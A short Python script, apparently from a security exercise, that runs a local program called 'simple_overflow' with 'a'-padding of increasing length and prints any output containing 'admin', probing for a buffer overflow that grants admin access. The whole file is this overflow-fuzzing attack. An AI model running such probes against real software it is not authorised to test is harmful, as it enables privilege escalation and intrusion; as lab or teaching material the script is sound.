import subprocess

for i in range(16, 160):
    call = subprocess.run(["./simple_overflow"], stdout=subprocess.PIPE,
            text = True, input="a" * i)
    if "admin" in call.stdout:
        print(call.stdout, end = "")
